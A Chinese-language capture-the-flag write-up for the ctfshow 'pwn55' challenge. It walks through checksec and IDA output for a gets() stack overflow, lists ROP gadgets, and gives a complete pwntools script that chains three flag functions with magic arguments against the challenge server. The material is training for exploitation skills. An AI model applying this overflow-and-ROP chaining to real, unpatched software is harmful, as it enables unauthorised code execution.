```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn55
```

```
tasike@tasike-VM:~/Desktop$ file pwn55
pwn55: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=32fb71b337f3e7b581260475c85be030f3f81b42, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn55
[*] '/home/tasike/Desktop/pwn55'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit`，未开启栈保护，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  logo(&argc);
  puts("How to find flag?");
  ctfshow();
  return 0;
}
```

`ctfshow`

```c
char *ctfshow()
{
  char s[40]; // [esp+Ch] [ebp-2Ch] BYREF

  printf("Input your flag: ");
  return gets(s);
}
```

`flag_func1`

```c
Elf32_Dyn **flag_func1()
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  flag1 = 1;
  return result;
}
```

`flag_func2`

```c
Elf32_Dyn **__cdecl flag_func2(int a1)
{
  Elf32_Dyn **result; // eax

  result = &GLOBAL_OFFSET_TABLE_;
  if ( flag1 && a1 == -1397969748 )
  {
    flag2 = 1;
  }
  else if ( flag1 )
  {
    return (Elf32_Dyn **)puts("Try Again.");
  }
  else
  {
    return (Elf32_Dyn **)puts("Try a little bit.");
  }
  return result;
}
```

> 单击`-1397969748`，再按`H`即可把数字切换为十六进制`0xACACACAC`

`flag`

```c
int __cdecl flag(int a1)
{
  char s[48]; // [esp+Ch] [ebp-3Ch] BYREF
  FILE *stream; // [esp+3Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 48, stream);
  if ( flag1 && flag2 && a1 == -1111638595 )
    return printf("%s", s);
  if ( flag1 && flag2 )
    return puts("Incorrect Argument.");
  if ( flag1 || flag2 )
    return puts("Nice Try!");
  return puts("Flag is not here!");
}
```

> 同样地，`-1111638595`可切换为`0xBDBDBDBD`

这题到这里很显然了，因此不做解释

查一下`pop|ret`

```
	tasike@tasike-VM:~/Desktop$ ROPgadget --binary pwn55 --only "pop|ret"
Gadgets information
============================================================
0x0804859b : pop ebp ; ret
0x08048908 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483c1 : pop ebx ; ret
0x0804890a : pop edi ; pop ebp ; ret
0x08048909 : pop esi ; pop edi ; pop ebp ; ret
0x080483aa : ret
0x0804851e : ret 0xeac1

Unique gadgets found: 7
```





编写`attack55.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28168)
flag1 = 0x08048586
flag2 = 0x0804859D
popebx = 0x080483c1
flag2_p = 0xACACACAC  # flag2_parameter
flag = 0x08048606
flag_p = 0xBDBDBDBD  # flag_parameter
payload = cyclic(0x2C + 0x4) + p32(flag1) + p32(flag2) + p32(popebx) + p32(flag2_p) + p32(flag) + p32(0) + p32(flag_p)
r.sendline(payload)
r.interactive()
```

